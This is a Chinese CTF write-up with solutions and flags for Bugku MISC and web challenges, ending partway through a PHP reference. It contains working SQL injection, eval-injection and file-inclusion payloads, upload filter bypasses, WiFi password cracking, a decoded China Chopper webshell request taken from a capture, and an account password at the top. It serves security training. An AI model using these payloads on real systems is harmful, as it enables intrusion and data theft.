**<font face="微软雅黑" color="black" size="7" align="center">BugkuCTF-writeup</font>**


#用户信息
---
链接：
	
	
	http://ctf.bugku.com/challenges  

用户名: 


	bugos 

密码:  

	
	19920211
联系方式：

	邮箱：admin@bugku.com
	QQ群1:457277976(已满)
	QQ群2:570630371(已满)
	QQ群3:662048179(已满)
	QQ群4:222959472(未满)

#题目解答
---
##MISC
1. 签到题 50  
关注微信公众号：Bugku
即可获取flag
下面也有二维码

		flag{BugKu-Sec-pwn!}
2. 这是一张单纯的图片 50

	> http://120.24.86.145:8002/misc/1.jpg  
	> 
	> FLAG在哪里？？

		&#107;&#101;&#121;&#123;&#121;&#111;&#117;&#32;&#97;&#114;&#101;&#32;&#114;&#105;&#103;&#104;&#116;&#125;
		HTML编码
		key{you are right}

3. 隐写 50  
	解压压缩文件

		图片文件损伤，修改0017处为F4，0010-0017描述了Chunk Data，表示图片尺寸，前四个字节是宽度，后四个字节是高度
		PNG文件头格式解析：
			http://blog.csdn.net/u013943420/article/details/76855416
			http://blog.csdn.net/hherima/article/details/45847043
		BUGKU{a1e5aSA}

4. telnet 50
	>http://120.24.86.145:8002/misc/telnet/1.zip  
	>key格式flag{xxxxxxxxxxxxxxxxxxxxxxxxxxx}

	解答：

		数据包分析，wireshark使用及网络协议的理解
		flag{d316759c281bf925d600be698a4973d5}

	备注：

		服务|默认端口|主要功能|工作方式|
		|:---:|:---:|:---:|:---:
		smtp|25|发送邮件|TCP|
		dns|53|域名和IP转换|UDP
		ftp|21|文件传输|TCP
		pop|110|接收邮件|TCP
		telnet|23|远程终端|TCP
		http|80|Web服务|TCP
	
5. 眼见非实(ISCCCTF) 50

		zip解压缩
		doc文件本质上是一个zip压缩文件，内部是XML格式的文件
		file命令判断一下文件格式：file 1.docx
		flag{F1@g}	

6. 又一张图片，还单纯吗 60  
	>http://120.24.86.145:8002/misc/2.jpg  
	>好像和上一个有点不一样

	 binwalk常用命令

		-e 分解出压缩包
			binwalk -e pcat.bin
		-D或者--dd 分解某种类型的文件（在windows里要用双引号括起来）
			binwalk -D=jpeg pcat.bin
		-M 递归分解扫描出来的文件（得跟-e或者-D配合使用）
			binwalk -eM pcat.bin
		
		参考用法：https://github.com/ReFirmLabs/binwalk/wiki/Usage

	dd常用命令

		dd if=1.jpg of=2.jpg skip=1234 bs=1
		http://blog.csdn.net/noviblue/article/details/56012275
		http://man.linuxde.net/dd

	解答：

		图种，在图片中还有一个图片，用binwalk分析，用dd命令提取
		falg{NSCTF_e6532a34928a3d1dadd0b049d5a3cc57}

7. 猜 60
	>http://120.24.86.145:8002/misc/cai/QQ20170221-132626.png
	
	>flag格式key{某人名字全拼}

	解答：

		搜索引擎识图（百度识图）
		key{liuyifei}

8. 宽带信息泄露 60
	>flag格式：
	>flag{宽带用户名}

	解答：
		
		conf.bin 看来是路由器配置文件
		上工具 routerpassview,查找username，wanpppconnection模块处定义宽带连接的配置信息
		flag{053700357621}

9. 隐写2 60  
	
	解答

		图种
		binwalk C:\Users\admin\Desktop\bugkuctf\MISC\9Welcome_.jpg
		binwalk -e C:\Users\admin\Desktop\bugkuctf\MISC\9Welcome_.jpg
		dd if=C:\Users\admin\Desktop\bugkuctf\MISC\9Welcome_.jpg of=C:\Users\admin\Desktop\bugkuctf\MISC\9Welcome_.zip skip=52516 bs=1
		根据提示JQK，键盘密码：？？？

10. 多种方法解决 60
	>在做题过程中你会得到一个二维码图片
	>http://120.24.86.145:8002/misc/3.zip

	解答：
		
		C:\fakepath\KEY.jpg
		解压zip,得到key.exe,用notepad打开，发现是图片的base64编码格式
		http://imgbase64.duoshitong.com/
		还原得到二维码，扫描二维码得到flag
		https://cli.im/deqr
		KEY{dca57f966e4e4e31fd5b15417da63269}
		
11. linux 80
	>http://120.24.86.145:8002/misc/1.tar.gz
	>linux基础问题

	解答：

		tar解压1.tar.gz文件
		tar命令及参数小结

		binwalk分析文件，发现是ext文件系统，怀疑是linux磁盘文件
		winhex查看文件，将镜像文件转为磁盘，出现flag.txt，查看即可
		key{feb81d3834e2423c9903f4755464060b}

		
12. 中国菜刀 80
	>国产神器

	解答：

		caidao.pcapng文件，流量数据包，用wireshark打开
		由于是菜刀的数据包，因此筛选http,post,得到菜刀的连接数据和下载数据，将数据字节流导出为zip格式

		123=array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JEY9IkM6XFx3d3dyb290XFxmbGFnLnRhci5neiI7JGZwPUBmb3BlbigkRiwncicpO2lmKEBmZ2V0YygkZnApKXtAZmNsb3NlKCRmcCk7QHJlYWRmaWxlKCRGKTt9ZWxzZXtlY2hvKCdFUlJPUjovLyBDYW4gTm90IFJlYWQnKTt9O2VjaG8oIlhAWSIpO2RpZSgpOw%3D%3D'));\");")); 

		@ini_set("display_errors","0");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo("X@Y");$F="C:\\wwwroot\\flag.tar.gz";$fp=@fopen($F,'r');if(@fgetc($fp)){@fclose($fp);@readfile($F);}else{echo('ERROR:// Can Not Read');};echo("X@Y");die();

		X@YwpWY0.+['|wACHnrda/Tp{Dt>v=ui[9YzG/opNGr:}?swcR?YN*mej$)$f,iMxyS(X@Y
		去掉X@Y，将文件命名为zip格式，解压缩后命名为12.txt,用notepad++打开，修改编码方式为UTF-8无BOM

		binwalk C:\Users\admin\Desktop\bugkuctf\MISC\12caidao\caidao.pcapng
		binwalk -e C:\Users\admin\Desktop\bugkuctf\MISC\12caidao\caidao.pcapng
		或者用dd命令提取文件
		key{8769fe393f2b998fa6a11afe2bfcd65e}

13. 这么多数据包 80
	>这么多数据包找找吧，先找到getshell的流

	解答：

		从第104个包开始应该是攻击机（192.168.116.138）在向目标机（192.168.116.159）进行端口扫描
		之后可以大致找到攻击机远程连接目标机的包（通过3389端口），以及smb协议的包（用于Web连接和客户端与服务器之间的信息沟通）
		再往下可以找到以5542开始的包已经getshell，追踪流可以看到其中有一个s4cr4t.txt的文件
		在第5561个数据包中，192.168.116.159向192.168.116.138发送数据包
		type s4cr4t.txt
		Q0NURntkb195b3VfbGlrZV9zbmlmZmVyfQ==
		C:\>
		base64 解码后得到flag
		CCTF{do_you_like_sniffer}

14. 隐写3 80

	解答：
	
		解压缩文件，binwalk分析文件
		winhex打开文件，修改高度即可
		flag{He1l0_d4_ba1}

15. 做个游戏(08067CTF) 80
	>坚持60秒

	解答：

		逆向工具查看源代码
		flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}
		flag{DajiDali_JinwanChiji}

16. 想蹭网先解开密码 100

		flag格式：flag{你破解的WiFi密码}
		
		tips：密码为手机号，为了不为难你，大佬特地让我悄悄地把前七位告诉你
		1391040**
		Goodluck!!
		
		作者@NewBee

	解答：

		wifi破解
		aircrack-ng
		make_dic
		C:\Users\admin\Desktop\make_dic.py
		E:\tools\CTF工具\路由破解\aircrack-ng\bin\64bit\aircrack-ng-avx.exe -w C:\Users\admin\Desktop\mutou.txt C:\Users\admin\Desktop\bugkuctf\MISC\16wifi.cap
		
		flag:flag{13910407686}
		



##WEB
1. web2 20
	>听说聪明的人都能找到答案

	>http://120.24.86.145:8002/web2/

		ctrl+u查看源代码，发现flag是明文
		KEY{Web-2-bugKssNNikls9100}

2. 文件上传测试 30

	>http://103.238.227.13:10085/

	>Flag格式：Flag:xxxxxxxxxxxxx

		法一：Content-Type: image/jpeg
		法二：修改文件后缀.png.php，response里面得到flag

		Flag:42e97d465f962c53df9549377b513c7e

3. 计算器 30

	>地址：http://120.24.86.145:8002/yanzhengma/

	`code.js`代码

		/*javascript*/
		$(function() {  
	    var code = 9999; 
	    function codes(){
	        var ranColor = '#' + ('00000' + (Math.random() * 0x1000000 << 0).toString(16)).slice(-6); //随机生成颜色  
	    	// alert(ranColor)  
	    	var ranColor2 = '#' + ('00000' + (Math.random() * 0x1000000 << 0).toString(16)).slice(-6);   
	     	var num1 = Math.floor(Math.random() * 100);    
	        var num2 = Math.floor(Math.random() * 100);    
	        code = num1 + num2;    
	        $("#code").html(num1 + "+" + num2 + "=?");    
	        if ($("#code").hasClass("nocode")) {    
	            $("#code").removeClass("nocode");    
	            $("#code").addClass("code");   
	           
	        }    
	        $("#code").css('background',ranColor);  
	         $("#code").css('color',ranColor2);  
	
	    }  
	    codes()
	   
	    $("#code").on('click',codes)
	      
	    $("#check").click(function(){ 
	        if ($(".input").val() == code && code != 9999) {  
	            alert("flag{CTF-bugku-0032}");  
	        } else {  
	            alert("输入有误!");  
	        }  
	    });  
		});  

    解法：

		法一：题目的输入框只能输入一个数字，果断审查元素，发现了输入框的最大长度被设置成了1,于是修改输入框的maxlength属性为5
		法二：网页通过JS在前端限制max-length,具体的验证代码实现在code.js中，查看js内容即可

		flag{CTF-bugku-0032

4. web基础$_GET 30

	>http://120.24.86.145:8002/get/

	解答：
		
		代码审计，get传值，$what=='flag'即可
		http://120.24.86.145:8002/get/?what=flag
		flag{bugku_get_su8kej2en}

5. web基础$_POST 30

	>http://120.24.86.145:8002/post/

	解答：
		
		代码审计，post传值，$what=flag即可
		http://120.24.86.145:8002/post/
		POST：what=flag
		
		flag{bugku_get_ssseint67se}
		
6. 矛盾 30

	>http://120.24.86.145:8002/get/index1.php

	
	解答：
		
		代码审计，!is_numeric($num)
		120.24.86.145:8002/get/index1.php?num=1e
		php弱类型，==比较之前先都转为数值
		
		flag{bugku-789-ps-ssdf}

7. web3 30

	>flag就在这里快来找找吧
	>http://120.24.86.145:8002/web3/

	解答：

		查看源代码
	   `&#75;&#69;&#89;&#123;&#74;&#50;&#115;&#97;&#52;&#50;&#97;&#104;&#74;&#75;&#45;&#72;&#83;&#49;&#49;&#73;&#73;&#73;&#125;`

		KEY{J2sa42ahJK-HS11III}

8. sql注入 50 

	>http://103.238.227.13:10083/

	>格式KEY{}

	解答：
		
		宽字节注入
		http://103.238.227.13:10083/?id=1 使用了'、'and 1=2',打开源码看了下gbk编码，考虑宽字符注入构造payloadhttp://103.238.227.13:10083/?id=1%df',成功了，就是宽字符注入。
		http://103.238.227.13:10083/?id=1%df' order by 2%23一共有两列
		http://103.238.227.13:10083/?id=1%df' union select 1,2--+
		http://103.238.227.13:10083/?id=1%df' union select 1,database()--+ 数据库是sql5
		http://103.238.227.13:10083/?id=1%df' union select 1,string from sql5.key--+ 题目要求查询string字段 查询key表
		http://103.238.227.13:10083/?id=1%df' union select 1,string from `key` where id=1%23
		ps:如果直接查询key表的话key既是表名又是字段名，具体的原因可以这样看
		payload:http://103.238.227.13:10083/?id=1%df' union select 1,string from key--+
		http://103.238.227.13:10083/?id=1%df' union select 1,table_name from information_schema.tables--+ 表名中有个key
		http://103.238.227.13:10083/?id=1%df' union select 1,column_name from information_schema.columns--+ 字段名中有个key
		
		54f3320dc261f313ba712eb3f13a1f6d
		KEY{gbk!#@}
		KEY{54f3320dc261f313ba712eb3f13a1f6d}

9. 域名解析 50

	>听说把 flag.bugku.com 解析到120.24.86.145 就能拿到flag
		
	解答：

		DNS服务器中无该域名的解析数据
		windows xp/2003/vista/2008/7/8用户HOSTS文件是在“c:\windows\system32\drivers\etc
		按下Win+R组合键，调出运行栏,在运行文本框输入c:\windows\system32\drivers\etc
		120.24.86.145	flag.bugku.com
		KEY{DSAHDSJ82HDS2211}
		
		在浏览器中修改重发数据包，访问地址120.24.86.145，host:flag.bugku.com在响应载荷中即可获得flag
		（模拟发送数据包）

		DNS解析的详细过程
		1、在浏览器中输入www  . qq  .com 域名，操作系统会先检查自己本地的hosts文件是否有这个网址映射关系，如果有，就先调用这个IP地址映射，完成域名解析。 
		2、如果hosts里没有这个域名的映射，则查找本地DNS解析器缓存，是否有这个网址映射关系，如果有，直接返回，完成域名解析
		3、如果hosts与本地DNS解析器缓存都没有相应的网址映射关系，首先会找TCP/ip参数中设置的首选DNS服务器，在此我们叫它本地DNS服务器，此服务器收到查询时，如果要查询的域名，包含在本地配置区域资源中，则返回解析结果给客户机，完成域名解析，此解析具有权威性。 
		4、如果要查询的域名，不由本地DNS服务器区域解析，但该服务器已缓存了此网址映射关系，则调用这个IP地址映射，完成域名解析，此解析不具有权威性。 
		5、如果本地DNS服务器本地区域文件与缓存解析都失效，则根据本地DNS服务器的设置（是否设置转发器）进行查询，如果未用转发模式，本地DNS就把请求发至13台根DNS，根DNS服务器收到请求后会判断这个域名(.com)是谁来授权管理，并会返回一个负责该顶级域名服务器的一个IP。本地DNS服务器收到IP信息后，将会联系负责.com域的这台服务器。这台负责.com域的服务器收到请求后，如果自己无法解析，它就会找一个管理.com域的下一级DNS服务器地址(http://qq.com)给本地DNS服务器。当本地DNS服务器收到这个地址后，就会找http://qq.com域服务器，重复上面的动作，进行查询，直至找到www  . qq  .com主机。 
		6、如果用的是转发模式，此DNS服务器就会把请求转发至上一级DNS服务器，由上一级服务器进行解析，上一级服务器如果不能解析，或找根DNS或把转请求转至上上级，以此循环。不管是本地DNS服务器用是是转发，还是根提示，最后都是把结果返回给本地DNS服务器，由此DNS服务器再返回给客户机。     从客户端到本地DNS服务器是属于递归查询，而DNS服务器之间就是的交互查询就是迭代查询。

10. SQL注入1 60
	>地址：http://103.238.227.13:10087/  
	>提示：过滤了关键字 你能绕过他吗  
	>flag格式KEY{xxxxxxxxxxxxx}   

	解答：
		
		substr_count() 函数计算子串在字符串中出现的次数。
		substr_count(string,substring,start,length)
		注释：子串是区分大小写的。
		注释：该函数不计数重叠的子串（参见例子 2）。
		注释：如果 start 参数加上 length 参数大于字符串长度，则该函数生成一个警告（参见例子 3）。

		strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签。
		注释：该函数始终会剥离 HTML 注释。这点无法通过 allow 参数改变。
		注释：该函数是二进制安全的。
		
		strip_tags()删除字符串中的<>标签及注释，因此可在注入过滤的关键词中加入<>，<!---->，<?php ?>绕过过滤
		payload:http://103.238.227.13:10087/?id=1 un<>ion se<>lect * f<>rom `key` where id=1%23
		KEY{c3d3c17b4ca7f791f85e#$1cc72af274af4adef}

11. 你必须让他停下 60
	>地址：http://120.24.86.145:8002/web12/  
	>作者：@berTrAM

	解答：

		function myrefresh(){
			window.location.reload();
			}
		setTimeout('myrefresh()',500)
		
		阻止页面自动刷新，开burp抓包发包
		flag{dummy_game_1s_s0_popular}
		
12. 本地包含 60
	>地址：http://120.24.86.145:8003/

	解答：
		
		var_dump — 打印变量的相关信息，此函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。 
		void var_dump ( mixed $expression [, mixed $... ] )

		eval执行漏洞

		http://120.24.86.145:8003/?hello=1);show_source(%27waf.php%27);var_dump(3
		http://120.24.86.145:8003/?hello=1);show_source(%27flag.php%27);var_dump(3

		flag{bug-ctf-gg-99}

13. 变量1 60
	>http://120.24.86.145:8004/index1.php

	解答：

		题目提示flag在变量里面，我们就要把所有的变量值都打印出来。看到题目使用了preg_match,使用正则匹配，变量名只能是字母或者数字的组合，最后输出$$args，把$args的内容当做变量来处理，所以构造payload
		http://120.24.86.145:8004/index1.php?args=GLOBALS 得到flag
		var_dump($GLOBALS)打印所有变量
		flag{92853051ab894a64f7865cf3c2128b34}

14. web5 60
	>JSPFUCK??????答案格式CTF{**}  
	>http://120.24.86.145:8002/web5/   
	>字母大写

	解答：
		js-jother
		ctf{whatfk}

		str="ctf{whatfk}";
		str1=str. toUpperCase()
		CTF{WHATFK}

15. web4 80
	>看看源代码吧  
	>http://120.24.86.145:8002/web4/
	
	解答：

		p1='%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62';
		p2='%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b';
		unescape(p1) + unescape('%35%34%61%61%32' + p2);
		
		function checkSubmit(){
			var a=document.getElementById("password");
			if("undefined"!=typeof a)
			{
				if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value)
					return!0;
				alert("Error");
				a.focus();
				return!1
			}}
		document.getElementById("levelQuest").onsubmit=checkSubmit;

		KEY{J22JK-HS11}

16. flag在index里 80
	>http://120.24.86.145:8005/post/

	解答：
		
		php文件包含，php://filter
		http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php
		
		<html>
    	<title>Bugku-ctf</title>
		<?php
			error_reporting(0);
			if(!$_GET[file]){echo '<a href="./index.php?file=show.php">click me? no</a>';}
			$file=$_GET['file'];
			if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
				echo "Oh no!";
				exit();
			}
			include($file); 
		//flag:flag{edulcni_elif_lacol_si_siht}
		?>
		</html>

17. 输入密码查看flag 80
	>http://120.24.86.145:8002/baopo/  
	>作者：Se7en
	
	解答：
	
		爆破5位数数字密码
		pwd=13579
		flag{bugku-baopo-hah}

18. 点击一百万次
80

	http://120.24.86.145:9001/test/
	hints:JavaScript

	解答：
		
		clicks=1000000；
		$("#clickcount").text(clicks);
		再点击一下图片即可
		flag{Not_C00kI3Cl1ck3r}

19. 备份是个好习惯
80

	http://120.24.86.145:8002/web16/

	听说备份是个好习惯

	解答：

		php备份文件index.php.bak

		include_once
			文件包含函数
			可能引发文件包含漏洞
		ini_set
			http://blog.csdn.net/littlebo01/article/details/45199161

			string ini_set ( string $varname , string $newvalue )
			ini_set更改php.ini配置，通过它修改php.in达到php上传文件大小限制是不行的，除非修改.htaccess文件

			magic_quotes_gpc 用 get_magic_quotes_gpc() 获得，不能用 set_magic_quotes_gpc 修改
			magic_quotes_runtime可以用set_magic_quotes_runtime()来设置
			upload_max_filesize的可修改范围是PHP_INI_PERDIR。
			PHP_INI_PERDIR的意思是域内指令可以在php.ini、httpd.conf或.htaccess文件中修改。
			PHP_INI_SYSTEM 域内指令可以在php.ini和httpd.conf文件中修改
			ini_set,post_max_size,upload_max_filesize,magic_quotes_gpc等用ini_set设置不了!

			ini_set('max_execution_time','10′);
			ini_set('memory_limit','1024M');\\'menory_limit'：设定一个脚本所能够申请到的最大内存字节数，这有利于写的不好的脚本消耗服务器上的可用内存。@符号代表不输出错误。
			@ini_set('display_errors', 1); \\‘display_errors'：设置错误信息的类别。
			@ini_set('session.auto_start', 0); 
			‘session.auto_start'：是否自动开session处理，设置为1时，程序中不用session_start()来手动开启session也可使用session， 
			
			如果参数为0，又没手动开启session，则会报错。 
			
			@ini_set('session.cache_expire', 180); 
			
			‘session.cache_expire'：指定会话页面在客户端cache中的有限期（分钟）缺省下为180分钟。如果设置了session.cache_limiter=nocache时，此处设置无 效。 
			
			@ini_set('session.use_cookies', 1); 
			
			‘session.use_cookies'：是否使用cookie在客户端保存会话ID； 
			
			@ini_set('session.use_trans_sid', 0); \\‘session.use_trans_sid'：是否使用明码在URL中显示SID（会话ID）， 
				默认是禁止的，因为它会给你用户带来安全危险： 
				1.用户可能将包含有效的sid的URL通过email/irc/QQ/MSN等途径告诉其他人。 
				2.包含有效sid的URL可能会保存在公用电脑上。 
				3.用户可能保存带有固定不变的SID的URL在他们的收藏夹或者浏览历史记录里。 基于URL的会话管理总是比基于Cookie的会话管理有更多的风险，所以应当禁用。
			
			echo 'max_execution_time = ' . ini_get('max_execution_time') . "";
			echo 'memory_limit = ' . ini_get('memory_limit') . "";
			echo 'post_max_size = ' . ini_get('post_max_size') . "";
			echo 'upload_max_filesize = ' . ini_get('upload_max_filesize') . "";
			
	
		strstr
			strstr() 函数搜索字符串在另一字符串中的第一次出现。
			该函数对大小写敏感。如需进行不区分大小写的搜索，请使用 stristr() 函数。
			strstr(string,search,before_search)
			echo strstr("I love Shanghai!","Shanghai");//shanghai!

		substr
			http://blog.csdn.net/haibo0668/article/details/52860898
			substr() 函数返回字符串的一部分。
			注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。

			$str = "123456789";  
			echo substr($str , 0 , 3);//从左边第一位字符起截取3位字符：结果：123  
			echo substr($str , 3 , 3);//从左边第3位字符起截取3位字符：结果：456
			
			$rest = substr("abcdef", -1);    // 返回 "f"  
			$rest = substr("abcdef", -2);    // 返回 "ef"  
			$rest = substr("abcdef", -3, 1); // 返回 "d" 

			$rest = substr("abcdef", 0, -1);  // 返回 "abcde"  
			$rest = substr("abcdef", 2, -1);  // 返回 "cde"  
			$rest = substr("abcdef", 4, -4);  // 返回 ""  
			$rest = substr("abcdef", -3, -1); // 返回 "de" 
			
			echo substr('abcdef', 1);     // bcdef  
			echo substr('abcdef', 1, 3);  // bcd  
			echo substr('abcdef', 0, 4);  // abcd  
			echo substr('abcdef', 0, 8);  // abcdef  
			echo substr('abcdef', -1, 1); // f  
			  
			// 访问字符串中的单个字符  
			// 也可以使用中括号  
			$string = 'abcdef';  
			echo $string[0];                 // a  
			echo $string[3];                 // d  
			echo $string[strlen($string)-1]; // f   

		str_replace
			str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）。
			str_replace(find,replace,string,count) 
			该函数必须遵循下列规则：
	    		如果搜索的字符串是数组，那么它将返回数组。
			    如果搜索的字符串是数组，那么它将对数组中的每个元素进行查找和替换。
			    如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余元素将用空字符串进行替换
			    如果查找的是数组，而替换的是字符串，那么替代字符串将对所有查找到的值起作用。
				str_replace并没有替换掉数组中相对应的字符串，而是把数组中的第一个替换，然后把相同的字符串后多余的合并		
			漏洞：
				1. 该函数区分大小写。请使用 str_ireplace() 函数执行不区分大小写的搜索。
				2. 该函数仅执行一次搜索替换，因此可进行构造字符串绕过，如kkeyey
				3. 组合拳
					<?php
					$test=str_replace($_GET['a'],'',$_GET['b']);
					echo $test;
					?>
					test.php?a=&b=%00'
					\0\'
					把0给替掉
					test.php?a=0&b=%00'
					\\' 	

		parse_str
			https://www.cnblogs.com/gengyi/p/6391242.html
			php parse_str函数将查询字符串解析到变量中。
			parse_str函数有两个参数，第一个参数为需要解析的查询字符串并且是必须的，第二个参数用于设置接收解析查询字符串的变量，第二个参数是可选的
			parse_str($str[,parr])
		
		$_SERVER
		
			$HTTP_SERVER_VARS [已删除]
			$_SERVER -- $HTTP_SERVER_VARS [已删除] — 服务器和执行环境信息
			
			说明
			$_SERVER超级变量，是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。这也就意味着大量的此类变量都会在» CGI 1.1 规范中说明，所以应该仔细研究一下。
			    Note: PHP 5.4.0 之前，$HTTP_SERVER_VARS 包含着相同的信息，但它不是一个超全局变量。 (注意 $HTTP_SERVER_VARS 与 $_SERVER 是不同的变量，PHP处理它们的方式不同) 
			
			目录
			在 $_SERVER 中，你也许能够，也许不能够找到下面的这些元素。注意，如果以命令行方式运行 PHP，下面列出的元素几乎没有有效的(或是没有任何实际意义的)。
			
			1. 'PHP_SELF'
			    当前执行脚本的文件名，与 document root 有关。例如，在地址为 http://example.com/foo/bar.php 的脚本中使用 $_SERVER['PHP_SELF'] 将得到 /foo/bar.php。__FILE__ 常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果 PHP 以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。 
			2. 'argv'
			    传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string。 
			3. 'argc'
			    包含命令行模式下传递给该脚本的参数的数目(如果运行在命令行模式下)。 
			4. 'GATEWAY_INTERFACE'
			    服务器使用的 CGI 规范的版本；例如，“CGI/1.1”。 
			5. 'SERVER_ADDR'
			    当前运行脚本所在的服务器的 IP 地址。 
			6. 'SERVER_NAME'
			    当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。
			        Note: 在 Apache 2 里，必须设置 UseCanonicalName = On 和 ServerName。 否则该值会由客户端提供，就有可能被伪造。 上下文有安全性要求的环境里，不应该依赖此值。 
			
			7. 'SERVER_SOFTWARE'
			    服务器标识字符串，在响应请求时的头信息中给出。 
			8. 'SERVER_PROTOCOL'
			    请求页面时通信协议的名称和版本。例如，“HTTP/1.0”。 
			9. 'REQUEST_METHOD'
			    访问页面使用的请求方法；例如，“GET”, “HEAD”，“POST”，“PUT”。			
			        Note:			
			        如果请求方法为 HEAD，PHP 脚本将在发送 Header 头信息之后终止(这意味着在产生任何输出后，不再有输出缓冲)。
			
			10. 'REQUEST_TIME'
			    请求开始时的时间戳。从 PHP 5.1.0 起可用。 
			11. 'REQUEST_TIME_FLOAT'
			    请求开始时的时间戳，微秒级别的精准度。 自 PHP 5.4.0 开始生效。 
			12. 'QUERY_STRING'
			    query string（查询字符串），如果有的话，通过它进行页面访问。 
			13. 'DOCUMENT_ROOT'
			    当前运行脚本所在的文档根目录。在服务器配置文件中定义。 
			14. 'HTTP_ACCEPT'
			    当前请求头中 Accept: 项的内容，如果存在的话。 
			15. 'HTTP_ACCEPT_CHARSET'
			    当前请求头中 Accept-Charset: 项的内容，如果存在的话。例如：“iso-8859-1,*,utf-8”。 
			16. 'HTTP_ACCEPT_ENCODING'
			    当前请求头中 Accept-Encoding: 项的内容，如果存在的话。例如：“gzip”。 
			17. 'HTTP_ACCEPT_LANGUAGE'
			    当前请求头中 Accept-Language: 项的内容，如果存在的话。例如：“en”。 
			18. 'HTTP_CONNECTION'
			    当前请求头中 Connection: 项的内容，如果存在的话。例如：“Keep-Alive”。 
			19. 'HTTP_HOST'
			    当前请求头中 Host: 项的内容，如果存在的话。 
			20. 'HTTP_REFERER'
			    引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP_REFERER 的功能。简言之，该值并不可信。 
			21. 'HTTP_USER_AGENT'
			    当前请求头中 User-Agent: 项的内容，如果存在的话。该字符串表明了访问该页面的用户代理的信息。一个典型的例子是：Mozilla/4.5 [en] (X11; U; Linux 2.2.9 i586)。除此之外，你可以通过 get_browser() 来使用该值，从而定制页面输出以便适应用户代理的性能。 
			22. 'HTTPS'
			    如果脚本是通过 HTTPS 协议被访问，则被设为一个非空的值。			
			        Note: 注意当使用 IIS 上的 ISAPI 方式时，如果不是通过 HTTPS 协议被访问，这个值将为 off。 			
			23. 'REMOTE_ADDR'
			    浏览当前页面的用户的 IP 地址。 
			24. 'REMOTE_HOST'
			    浏览当前页面的用户的主机名。DNS 反向解析不依赖于用户的 REMOTE_ADDR。			
			        Note: 你的服务器必须被配置以便产生这个变量。例如在 Apache 中，你需要在 httpd.conf 中设置 HostnameLookups On 来产生它。参见 gethostbyaddr()。 			
			25. 'REMOTE_PORT'
			    用户机器上连接到 Web 服务器所使用的端口号。 
			26. 'REMOTE_USER'
			    经验证的用户 
			27. 'REDIRECT_REMOTE_USER'
			    验证的用户，如果请求已在内部重定向。 
			28. 'SCRIPT_FILENAME'			
			    当前执行脚本的绝对路径。		
			        Note:			
			        如果在命令行界面（Command Line Interface, CLI）使用相对路径执行脚本，例如 file.php 或 ../file.php，那么 $_SERVER['SCRIPT_FILENAME'] 将包含用户指定的相对路径。			
			29. 'SERVER_ADMIN'
			    该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。如果脚本运行在一个虚拟主机上，则该值是那个虚拟主机的值。 
			30. 'SERVER_PORT'
			    Web 服务器使用的端口。默认值为 “80”。如果使用 SSL 安全连接，则这个值为用户设置的 HTTP 端口。			
			        Note: 在 Apache 2 里，为了获取真实物理端口，必须设置 UseCanonicalName = On 以及 UseCanonicalPhysicalPort = On。 否则此值可能被伪造，不一定会返回真实端口值。 上下文有安全性要求的环境里，不应该依赖此值。 			
			31. 'SERVER_SIGNATURE'
			    包含了服务器版本和虚拟主机名的字符串。 
			32. 'PATH_TRANSLATED'
			    当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。			
			        Note: 自 PHP 4.3.2 起，PATH_TRANSLATED 在 Apache 2 SAPI 模式下不再和 Apache 1 一样隐含赋值，而是若 Apache 不生成此值，PHP 便自己生成并将其值放入 SCRIPT_FILENAME 服务器常量中。这个修改遵守了 CGI 规范，PATH_TRANSLATED 仅在 PATH_INFO 被定义的条件下才存在。 Apache 2 用户可以在 httpd.conf 中设置 AcceptPathInfo = On 来定义 PATH_INFO。 			
			33. 'SCRIPT_NAME'
			    包含当前脚本的路径。这在页面需要指向自己时非常有用。__FILE__ 常量包含当前脚本(例如包含文件)的完整路径和文件名。 
			34. 'REQUEST_URI'
